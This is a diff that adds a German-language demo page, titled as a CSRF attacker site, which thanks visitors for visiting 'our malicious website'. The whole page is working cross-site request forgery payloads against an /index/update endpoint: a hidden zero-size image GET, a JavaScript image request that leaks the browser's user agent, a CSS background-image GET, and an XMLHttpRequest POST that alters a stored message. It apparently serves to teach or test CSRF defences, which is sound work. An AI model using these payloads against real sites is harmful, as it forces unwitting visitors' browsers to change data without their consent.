@@ -1,0 +1,34 @@
+<html>
+<head>
+	<title>CSRF-Angreifer</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+</head>
+<body>
+<p>Vielen Dank, dass Sie unsere bösartige Webseite besucht haben!</p>
+
+
+<!-- CSRF über GET -->
+
+<img alt="" src="/index/update/message/Ich%20bin%20ein%20HTML-%20CSRF-Opfer" style="height: 0; width: 0;"/>
+
+<script type="text/javascript">
+var $img = new Image();
+$img.src = "/index/update/message/" + escape("JavaScript-CSRF: Mein Browser ist " + navigator.userAgent);
+</script>
+
+<p style="background-image: url(/index/update/message/CSS-CSRF-Angriff);"></p>
+
+
+<!-- CSRF über POST -->
+
+<script type="text/javascript">
+var xmlHttp = new XMLHttpRequest();
+if (xmlHttp) {
+	xmlHttp.open('POST', '/index/update', true);
+	xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xmlHttp.send("message=" + escape("CSRF-Angriff über POST möglich"));
+}
+</script>
+
+</body>
+</html>
